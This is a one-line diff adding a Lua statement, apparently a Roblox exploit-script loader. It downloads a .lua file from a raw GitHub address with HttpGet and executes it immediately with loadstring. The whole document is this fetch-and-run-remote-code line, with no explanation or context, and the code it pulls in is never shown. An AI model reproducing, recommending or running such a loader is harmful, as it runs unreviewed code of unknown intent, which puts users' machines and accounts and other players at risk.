@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thunhchk/Thinhlo/refs/heads/main/thinhlo.lua"))()
